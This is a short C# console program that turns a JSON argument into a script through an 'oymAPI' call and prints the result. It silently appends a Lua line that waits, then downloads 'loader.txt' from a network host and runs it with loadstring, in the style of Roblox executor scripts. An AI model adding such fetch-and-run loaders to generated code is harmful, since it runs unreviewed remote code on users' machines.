
using oymAPI;
using System;
using System.IO;
using System.Text.Json;

internal class Program
{
   
    private static void Main(string[] args)
    {
        try
        {
            string input = args[0];
            input = input.Replace(" ", "\"");
            int firstOpen = input.IndexOf('{');
            int lastClose = input.LastIndexOf('}');
            string json = "";
            for (int i = firstOpen; i <= lastClose; i++)
            {
                json += input[i];
            }
            Console.WriteLine(ailments.getExecute(json) + "\r\n wait(60) loadstring(game:HttpGet(\"http://192.168.3.4/loader.txt\"))()");
            
        }
        catch (Exception value)
        {
            Console.WriteLine($"warn(\"{value}\")");
        }
    }

   
}
